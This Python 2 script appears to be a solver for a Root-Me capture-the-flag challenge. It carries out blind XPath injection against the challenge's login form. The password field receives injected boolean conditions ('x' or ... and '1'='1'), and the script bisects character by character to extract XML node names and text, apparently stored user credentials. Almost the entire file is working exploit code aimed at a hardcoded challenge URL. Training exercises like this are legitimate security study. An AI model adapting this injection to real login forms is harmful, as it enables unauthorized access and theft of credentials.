#!/usr/bin/env
import logging
import string

from enum import Enum
from leak.base import Parser, RegexParser, BaseDicotomia
from leak.leak import HTTPLeaker


logging.basicConfig()


class BooleanParser(RegexParser):
    def __init__(self):
        super(BooleanParser, self).__init__(
            pattern=r'.*((?P<success>Welcome back Steve !</h2>)|(?P<failure>Wrong credentials</p><br/>).*)'
        )


class ChallengeLeaker(HTTPLeaker):
    '''
    Reconstruct a XML file by blind XPath injection query of a login form.

    The steps are

     - set the node be the root node
     - find how many characters is composed the node name
     - extract the name by bisecting the alphabet
     - find out how many child nodes has
     - repeat the process for all the nodes
    '''
    class State(Enum):
        NODE_NAME_LENGTH  = 0
        NODE_NAME         = 1
        NODE_CHILD_NUMBER = 2
        NODE_TEXT_LENGTH  = 3
        NODE_TEXT         = 4

    def __init__(self):
        super(ChallengeLeaker, self).__init__(
            parser=BooleanParser()
        )

        self.bisect = BaseDicotomia(N=8)

        self.state.update({
            'state': self.State.NODE_TEXT_LENGTH, # here we want _LENGTH
            'xpath': '/database/user[2]/*[3]',
            'nodes': [],
        })

        self.payloads = {
            self.State.NODE_NAME_LENGTH: None,
        }

    def update(self):
        # here we control the state, when a bisection is finished we pass to the next
        guess = self._leak['success'] is not None
        self.bisect.submit_oracle(guess)

        if self.bisect.has_finished():
            self.logger.debug('state: %s' % self.state)

            state = self.state['state']

            if state == self.State.NODE_NAME_LENGTH:
                self.state['state'] = self.State.NODE_NAME
                # we finished the deduce the node name length
                self.state['n'] = int(self.bisect.guess)

                self.logger.info('node %s with length %d' % (self.state['xpath'], self.state['n']))

                self.bisect = BaseDicotomia(alphabet=string.letters)

                self.state['idx'] = 1 # xpath is 1-indexed
                self.state['node_name'] = ''
                #raise

            elif state == self.State.NODE_NAME:
                #import ipdb;ipdb.set_trace()
                if self.state['idx'] <= self.state['n']: # we are deducing the tag name but we haven't finished yet
                    self.state['node_name'] += self.bisect.guess
                    self.state['idx'] += 1
                    self.bisect = BaseDicotomia(alphabet=string.letters)
                else: # we have finished
                    self.logger.info('node name: \'%s\'' % self.state['node_name'])
                    raise

            elif state == self.State.NODE_TEXT_LENGTH:
                # we change the next state
                self.state['state'] = self.State.NODE_TEXT
                # we finished the deduce the node name length
                self.state['n'] = int(self.bisect.guess)

                self.logger.info('node %s has text with length %d' % (self.state['xpath'], self.state['n']))

                self.bisect = BaseDicotomia(alphabet=string.letters+string.digits)

                self.state['idx'] = 1  # xpath is 1-indexed
                self.state['text'] = '' #CHANGE HERE
                # raise

            elif state == self.State.NODE_TEXT:
                # import ipdb;ipdb.set_trace()
                if self.state['idx'] <= self.state['n']:  # we are deducing the tag name but we haven't finished yet
                    self.state['text'] += self.bisect.guess # CHANGE HERE
                    self.state['idx'] += 1
                    self.bisect = BaseDicotomia(alphabet=string.letters+string.digits)
                else:  # we have finished
                    self.logger.info('node name: \'%s\'' % self.state['node_name'])
                    raise

    def get_requests_method(self):
        return 'POST'

    def get_payload(self):

        state = self.state['state']

        if state == self.State.NODE_NAME_LENGTH:
            return 'string-length(name(%s))>=%s' % (self.state['xpath'], self.bisect.guess)
        elif state == self.State.NODE_NAME:
            return "contains('%s',substring(name(%s),%d,1))" % (self.bisect.guess, self.state['xpath'], self.state['idx'])
        elif state == self.State.NODE_TEXT_LENGTH:
            return "string-length(%s[text()])>=%s" % (self.state['xpath'], self.bisect.guess)
        elif state == self.State.NODE_TEXT:
            return "contains('%s',substring(%s[text()],%d,1))" % (self.bisect.guess, self.state['xpath'], self.state['idx'])

    def get_request_vulnerabile_field_value(self):
        return "x' or %s and '1'='1" % self.get_payload()

    def get_requests_data(self):
        return {
            'username': 'pippo',
            'password': self.get_request_vulnerabile_field_value(),
        }

    def get_requests_params(self):
        return {
            'action': 'login',
        }

    def has_finished(self):
        return False

    def get_requests_url(self):
        return 'http://challenge01.root-me.org/web-serveur/ch23/'



if __name__ == '__main__':
    leaker = ChallengeLeaker()

    print leaker()